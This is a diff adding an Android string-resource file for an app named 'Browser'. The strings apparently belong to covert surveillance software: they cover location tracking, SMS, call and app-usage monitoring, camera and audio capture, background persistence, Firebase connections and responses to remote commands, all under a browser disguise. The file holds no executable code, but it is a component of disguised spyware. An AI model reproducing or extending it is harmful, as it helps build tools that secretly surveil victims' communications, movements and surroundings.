@@ -1,0 +1,66 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="app_name">Browser</string>
+    <string name="default_notification_channel_id">browser_notifications</string>
+    <string name="default_notification_channel_name">Browser Notifications</string>
+    
+    <!-- Permission Strings -->
+    <string name="permission_required_title">Permissions Required</string>
+    <string name="permission_required_message">This app requires certain permissions to function properly. Please grant all permissions to continue.</string>
+    <string name="permission_denied_title">Permission Denied</string>
+    <string name="permission_denied_message">Some permissions were denied. The app may not function correctly.</string>
+    
+    <!-- Usage Stats Permission -->
+    <string name="usage_stats_permission_title">Usage Access Required</string>
+    <string name="usage_stats_permission_message">Please enable usage access for this app to monitor app usage statistics.</string>
+    
+    <!-- Battery Optimization -->
+    <string name="battery_optimization_title">Battery Optimization</string>
+    <string name="battery_optimization_message">Please disable battery optimization for this app to ensure it runs in the background.</string>
+    
+    <!-- Service Notifications -->
+    <string name="service_notification_title">Browser Service</string>
+    <string name="service_notification_content">Browser is running in the background</string>
+    
+    <!-- Error Messages -->
+    <string name="error_location_permission">Location permission is required for tracking</string>
+    <string name="error_sms_permission">SMS permission is required for message monitoring</string>
+    <string name="error_call_permission">Call log permission is required for call monitoring</string>
+    <string name="error_contacts_permission">Contacts permission is required for contact synchronization</string>
+    <string name="error_camera_permission">Camera permission is required for photo capture</string>
+    <string name="error_audio_permission">Audio permission is required for recording</string>
+    <string name="error_storage_permission">Storage permission is required for file access</string>
+    
+    <!-- Status Messages -->
+    <string name="status_monitoring_active">Monitoring services are active</string>
+    <string name="status_monitoring_inactive">Monitoring services are not running</string>
+    <string name="status_permissions_granted">All permissions granted</string>
+    <string name="status_permissions_missing">Some permissions are missing</string>
+    
+    <!-- Button Labels -->
+    <string name="button_grant_permissions">Grant Permissions</string>
+    <string name="button_open_settings">Open Settings</string>
+    <string name="button_continue">Continue</string>
+    <string name="button_retry">Retry</string>
+    
+    <!-- Firebase Messages -->
+    <string name="firebase_auth_success">Authentication successful</string>
+    <string name="firebase_auth_failed">Authentication failed</string>
+    <string name="firebase_connection_success">Connected to Firebase</string>
+    <string name="firebase_connection_failed">Failed to connect to Firebase</string>
+    
+    <!-- Command Responses -->
+    <string name="command_executed_successfully">Command executed successfully</string>
+    <string name="command_execution_failed">Command execution failed</string>
+    <string name="command_unknown">Unknown command received</string>
+    
+    <!-- Monitoring Messages -->
+    <string name="location_tracking_started">Location tracking started</string>
+    <string name="location_tracking_stopped">Location tracking stopped</string>
+    <string name="sms_monitoring_started">SMS monitoring started</string>
+    <string name="sms_monitoring_stopped">SMS monitoring stopped</string>
+    <string name="call_monitoring_started">Call monitoring started</string>
+    <string name="call_monitoring_stopped">Call monitoring stopped</string>
+    <string name="app_usage_monitoring_started">App usage monitoring started</string>
+    <string name="app_usage_monitoring_stopped">App usage monitoring stopped</string>
+</resources>
